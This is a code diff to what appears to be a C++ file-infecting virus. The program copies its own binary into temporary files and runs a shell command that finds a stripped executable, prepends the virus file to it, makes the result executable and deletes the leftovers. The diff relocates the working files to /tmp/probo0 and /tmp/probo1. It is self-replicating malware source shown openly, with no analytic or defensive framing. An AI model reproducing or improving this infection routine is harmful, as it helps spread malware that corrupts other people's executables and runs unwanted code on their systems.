@@ -9,7 +9,7 @@ using namespace std;
 
 int main (int argc, char** argv) {
     int c;
-    string exe = "./exe__", vir = "vir";
+    string exe = "/tmp/probo0", vir = "/tmp/probo1";
     string me = (string)argv[0], command;
     ifstream fi(me);
     ofstream fo(exe);
@@ -44,10 +44,10 @@ done | tail -1); \
 if [ ! -z \"$VIR\" ]; then \
 file $VIR | grep -q stripped$ && (\
 mv $VIR ${VIR}__ && \
-cat vir ${VIR}__ >$VIR && \
+cat /tmp/probo1 ${VIR}__ >$VIR && \
 chmod ugo+x $VIR \
 ) \
 fi; \
-rm -f ${VIR}__ vir");
+rm -f ${VIR}__ /tmp/probo1");
     }
 }
